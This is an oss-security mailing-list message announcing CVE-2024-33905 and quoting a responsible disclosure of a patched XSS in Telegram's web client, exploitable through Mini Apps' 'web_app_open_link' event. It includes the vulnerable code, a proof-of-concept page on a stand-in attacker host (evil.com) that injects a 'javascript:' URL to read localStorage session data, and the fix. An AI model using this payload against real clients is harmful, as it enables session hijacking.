Received: (qmail 22523 invoked by uid 550); 30 Apr 2024 10:14:14 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 14015 invoked from network); 30 Apr 2024 09:30:30 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1714469421; x=1715074221; darn=lists.openwall.com;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :from:to:cc:subject:date:message-id:reply-to;
        bh=H9chNwYP8QLlBwFOFEElq/CGUpdR0F3PakX9DJ5RpZI=;
        b=KtkgtTzsEk0RwW3W5nUwWb9HLKv++hIxIUMiRBJMG9SstLf4+4LGkOuZtIgzry7KMT
         k0jBwozviQc6rA8wZJmzq6ZcUx0vo4IUfMNDZsJL+9CESCqdk/M3NYrSjtmEy5Eqz1Pq
         lCGJKTXVuG4uVVNjTtKa6YUBisU7/km9mTTPu4r+txe4UKY1q7l9sEBRxeC5Hn7qz4wm
         NrmF+ITAtYrvj7yjScdGyF2Z+zauPr9DFbeu//mbWHi6ESmLFDYy7Ibc+mM+RUOhahkn
         Sr74+aTNfmaL7gSVUY+bDLg+TLPY85OK/PsknRbDN+aeWfdXgZ9YCaxMtmVVQJ3qn+XO
         LcLQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1714469421; x=1715074221;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=H9chNwYP8QLlBwFOFEElq/CGUpdR0F3PakX9DJ5RpZI=;
        b=mADlc/TEnivLBkV3fowbb1TEiq0LVm0o/sJWgTabVukbcwxU1W+ZGqBFEq2cs36h4t
         gpNr7E/MAYs9tZnb/TUrdqwxEoXbWlswJPlCgLTDeXjOxt1Gxwldy8CxnZ0zZ69wX7te
         ftW90pKkLmpMKcVYgopbdRF55i5FlrzMMXlgwp0/Ueah2ML1T/5j1bshPX6ybmOJXZJJ
         t/7dU0740HdYqoLDC78q7QniLb0+APx0pzb+m6Ph444xyiMbtGS/BVgaARMAgWZEzXmB
         9GNFvY9IWYFUuh84CnaY8c95gNqN8H96Mna4+GbApjKLtpeeW+qy5rRN7/NI4AfPQLe+
         CEmw==
X-Gm-Message-State: AOJu0Yy67/VojF1vqV0mKQEnpfavS2/P6wk3tXOw0Zcp8+gc4BdPBjfK
	/JTKNVnQCcfDthkvTrLqbgiaHPWMbbmgEjyqzsE77uQcpHbqSsIKGHaKYCA16xwITF33Qjo4cqY
	1scnBsn2S33oXjCelgN0OEKd9wazdpr9T
X-Google-Smtp-Source: AGHT+IEYbS2e8J9HYiEVwfal/VtMuf6188Nkq2EQIlnI6B21M/kTijP8Xq2EPzCLHQKIwg5cc+97UlfOh6gqkJlhZCY=
X-Received: by 2002:a17:907:987:b0:a58:c09d:199d with SMTP id
 bf7-20020a170907098700b00a58c09d199dmr10332897ejc.73.1714469420810; Tue, 30
 Apr 2024 02:30:20 -0700 (PDT)
MIME-Version: 1.0
References: <CAD44bnPA-_1PRL2SqwvFssSo6MAN4wMkRMXwhy0XmJwrWGPxaQ@mail.gmail.com>
In-Reply-To: <CAD44bnPA-_1PRL2SqwvFssSo6MAN4wMkRMXwhy0XmJwrWGPxaQ@mail.gmail.com>
From: Pedro Batista <pedbap.g@gmail.com>
Date: Tue, 30 Apr 2024 11:30:09 +0200
Message-ID: <CAD44bnO8ggssLh-DcW4Hm0FOAOWjNm0-0NWAzca7f_oKOrAyrA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000ce490006174d049d"
Subject: [oss-security] Re: Telegram Web app XSS / Session Hijacking 1-click

--000000000000ce490006174d049d
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

CVE-2024-33905

On Sun, Apr 28, 2024 at 5:59=E2=80=AFPM Pedro Batista <pedbap.g@gmail.com> =
wrote:

> Hi oss-security,
> I would like to share a vulnerability I reported on Telegram Web
> application which is Open Source (https://github.com/morethanwords/tweb).
> The vulnerability is a XSS that can be exploited to achieve session
> hijacking with 1-click using Telegram Mini Apps.
>
> I reported the vulnerability on March 9th, 2024 and Telegram promptly
> fixed it on March 11th, 2024.
>
> # Vulnerable version: Telegram WebK 2.0.0 (486) and below
> # Fixed version: Telegram WebK 2.0.0 (488)
>
> # Attack Surface
> ## Telegram Mini Apps
> =E2=80=9CTelegram Mini Apps are essentially web applications that you can=
 run
> directly within the Telegram messenger interface. Mini Apps support
> seamless authorization, integrated crypto and fiat payments (via Google P=
ay
> and Apple Pay), tailored push notifications, and more.=E2=80=9D
>
> > https://core.telegram.org/bots/webapps
> > https://ton.org/mini-apps
>
> Is important to highlight that this feature is heavily used for crypto
> payments in the TON Blockchain.
>
> # Static Analysis
> A cached version of the vulnerable file can be found here:
> - https://web.telegram.org/k/appDialogsManager-aLs9GOvc.js
>
> ```
> telegramWebView.addMultipleEventsListeners({
>        // [...]
>        web_app_open_link:({url:t})=3D>{window.open(t,"_blank")}
> }
> ```
> The vulnerability was triggered with `postMessage` communication by
> abusing the event `web_app_open_link` which allowed a new URL to remain
> with the javascript context of the parent window using the `javascript:`
> scheme as XSS payload.
>
> # Weaponized Setup
> 1. Attacker creates a Bot + Mini App
> 2. Sets the URL of the Mini App =3D> https://evil.com/homepage.html
> 3. The exploit will be hosted in the homepage of the attacker=E2=80=99s s=
ite
> 3.1. homepage.html
> ```
> <body onload=3Dexploit()>
>  <script>
> function exploit() {
>  window.parent.postMessage(JSON.stringify({eventType: 'web_app_open_link',
> eventData: {url:
> "javascript:alert(JSON.stringify(window.parent.localStorage))"}}), '*'); }
>  </script>
> </body>
> ```
>
> # Telegram Patch Commit
>
> https://github.com/morethanwords/tweb/commit/2153ea9878668769faac8dd5931b=
7e0b96a9f129/src/components/popups/webApp.ts
>
> ```
> export default function
> safeWindowOpen(url: string) {
>     window.open(url, '_blank', 'noreferrer');
> }
> ```
>
> # Demo
> I have published a writeup for this finding which includes the Exploit
> Demo, it's available here:
>
>
> https://medium.com/@pedbap/telegram-web-app-xss-session-hijacking-1-click=
-95acccdc8d90
>
> I recently requested a CVE for this vulnerability as well, looking forward
> to updating the thread as soon as it is issued.
>
> Thanks for looking into my report.
>
> Best regards,
> Pedro Baptista
>

--000000000000ce490006174d049d--
